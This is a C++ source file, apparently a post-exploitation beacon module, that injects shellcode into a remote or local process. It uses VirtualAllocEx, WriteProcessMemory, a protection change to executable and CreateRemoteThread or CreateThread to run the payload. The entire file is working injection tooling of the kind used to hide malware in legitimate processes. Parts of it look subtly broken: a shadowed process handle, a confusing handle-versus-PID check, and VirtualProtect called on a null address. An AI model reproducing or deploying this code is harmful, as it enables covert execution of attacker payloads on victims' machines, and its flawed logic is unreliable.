#include <general.h>

auto ExplicitInjection(
    _In_  INT64 ProcessObj,
    _In_  PBYTE ShellcodeBuff,
    _In_  ULONG ShellcodeSize,
    _In_  PBYTE Argument
) -> NTSTATUS {
    LONG   ErrorCode     = ERROR_SUCCESS;
    BOOL   IsHandle      = (0xFF < ProcessObj);
    HANDLE ProcessHandle = (HANDLE)ProcessObj;
    HANDLE ThreadHandle  = nullptr;

    SIZE_T BytesWritten  = 0;
    ULONG  OldProtection = 0;
    ULONG  ThreadId      = 0;
    PVOID  ShellcodePtr  = nullptr;

    if ( IsHandle ) {
        HANDLE ProcessHandle = OpenProcess( PROCESS_ALL_ACCESS, FALSE, ProcessObj );
        if ( ! ProcessHandle ) {
            ErrorCode = GetLastError();
            BeaconPrintfW( CALLBACK_ERROR, L"Open handle to target process failed with error: (%d) %s", ErrorCode, fmt_error( ErrorCode ) );
            return ErrorCode;
        }

        ShellcodePtr = VirtualAllocEx( ProcessHandle, nullptr, ShellcodeSize, MEM_COMMIT, PAGE_READWRITE );
        if ( ! ShellcodePtr ) {
            ErrorCode = GetLastError();
            BeaconPrintfW( CALLBACK_ERROR, L"Allocation memory to shellcode failed with error: (%d) %s", ErrorCode, fmt_error( ErrorCode ) );
            return ErrorCode;
        }

        if ( ! WriteProcessMemory( ProcessHandle, ShellcodePtr, ShellcodeBuff, ShellcodeSize, &BytesWritten ) ) {
            ErrorCode = GetLastError();
            BeaconPrintfW( CALLBACK_ERROR, L"Write shellcode failed with error: (%d) %s", ErrorCode, fmt_error( ErrorCode ) );
            return ErrorCode;
        }

        if ( ! VirtualProtectEx( ProcessHandle, ShellcodePtr, ShellcodeSize, PAGE_EXECUTE_READ, &OldProtection ) ) {
            ErrorCode = GetLastError();
            BeaconPrintfW( CALLBACK_ERROR, L"Change protection to RX failed with error: (%d) %s", ErrorCode, fmt_error( ErrorCode ) );
            return ErrorCode;
        }

        if ( ! ( ThreadHandle =  CreateRemoteThread( ProcessHandle, nullptr, 0, (LPTHREAD_START_ROUTINE)ShellcodePtr, Argument, 0, &ThreadId ) ) ) {
            ErrorCode = GetLastError();
            BeaconPrintfW( CALLBACK_ERROR, L"Create thread to execute shellcode failed with error: (%d) %s", ErrorCode, fmt_error( ErrorCode ) );
            return ErrorCode;
        }
    } else {
        ShellcodePtr = VirtualAlloc( nullptr, ShellcodeSize, MEM_COMMIT, PAGE_READWRITE );
        if ( ! ShellcodePtr ) {
            ErrorCode = GetLastError();
            BeaconPrintfW( CALLBACK_ERROR, L"Allocation memory to shellcode failed with error: (%d) %s", ErrorCode, fmt_error( ErrorCode ) );
            return ErrorCode;
        }

        memcpy( ShellcodePtr, ShellcodeBuff, ShellcodeSize );

        if ( ! VirtualProtect( nullptr, ShellcodeSize, PAGE_EXECUTE_READ, &OldProtection ) ) {
            ErrorCode = GetLastError();
            BeaconPrintfW( CALLBACK_ERROR, L"Change protection to RX failed with error: (%d) %s", ErrorCode, fmt_error( ErrorCode ) );
            return ErrorCode;
        }

        // mandatory executing in another thread
        if ( ! ( ThreadHandle =  CreateThread( nullptr, 0, (LPTHREAD_START_ROUTINE)ShellcodePtr, nullptr, 0, &ThreadId ) ) ) {
            ErrorCode = GetLastError();
            BeaconPrintfW( CALLBACK_ERROR, L"Create thread to execute shellcode failed with error: (%d) %s", ErrorCode, fmt_error( ErrorCode ) );
            return ErrorCode;
        }
    }

    BeaconPrintfW( CALLBACK_OUTPUT, L"Executing Shellcode in Thread ID: %d\n", ThreadId );

    return ErrorCode;
}
